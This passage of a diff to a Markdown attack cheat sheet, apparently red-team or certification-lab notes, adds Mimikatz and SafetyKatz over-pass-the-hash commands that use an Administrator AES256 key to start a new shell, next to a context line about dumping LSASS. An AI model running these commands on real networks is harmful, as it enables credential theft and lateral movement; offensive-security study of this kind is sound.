@@ -468,10 +468,22 @@ $ tasklist /FI "IMAGENAME eq lsass.exe" rundll32.exe C:\windows\System32\comsvcs
 
 - Over Pass the hash (OPTH) generate tokens from hashes or keys. Needs elevation (Run as administrator)
 
+- Using `Mimikatz`
 
 ```powershell
 $ Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:us.techcorp.local /aes256:<aes256key> /run:powershell.exe"'
 ```
 
+- Using `SafetyKatz`
 
--  
+```powershell
+$ SafetyKatz.exe "sekurlsa::pth /user:administrator /domain:us.techcorp.local /aes256:<aes256keys> /run:cmd.exe" "exit"
+```
+
+
+- The above commands starts a PowerShell session with a logon type 9 (same as runas /netonly).
+
+
+
+- Over Pass the hash (OPTH) generate tokens from hashes or keys.
+- Below doesn't need el
